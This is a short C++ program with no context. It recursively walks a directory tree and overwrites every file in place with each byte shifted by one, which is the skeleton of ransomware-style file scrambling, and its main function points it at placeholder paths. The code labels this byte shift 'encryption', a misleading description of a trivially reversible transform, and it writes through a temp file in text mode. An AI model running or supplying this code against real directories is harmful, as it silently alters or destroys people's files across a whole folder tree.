#include <iostream>
#include <fstream>
#include <dirent.h>
#include <sys/stat.h>
#include <cstring> 

void encryptFile(std::string filePath) {
    std::fstream file, tempFile;
    std::string tempFilePath = "temp.txt";

    file.open(filePath, std::ios::in);
    tempFile.open(tempFilePath, std::ios::out);

    char byte;
    while (file >> std::noskipws >> byte) {
        byte += 1;
        tempFile << byte;
    }

    file.close();
    tempFile.close();

    file.open(filePath, std::ios::out);
    tempFile.open(tempFilePath, std::ios::in);

    while (tempFile >> std::noskipws >> byte) {
        file << byte;
    }

    file.close();
    tempFile.close();

    remove(tempFilePath.c_str());
}

void encryptDirectory(std::string directoryPath) {
    DIR* directory;
    struct dirent* entry;
    struct stat status;
    std::string path;

    if ((directory = opendir(directoryPath.c_str())) != NULL) {
        while ((entry = readdir(directory)) != NULL) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                path = directoryPath + "/" + entry->d_name;
                stat(path.c_str(), &status);

                if (S_ISDIR(status.st_mode)) {
                    encryptDirectory(path);
                } else {
                    encryptFile(path);
                }
            }
        }
        closedir(directory); 
    }
}

int main() {
    encryptDirectory("path dir");
    encryptFile("path file");
    return 0; 
}
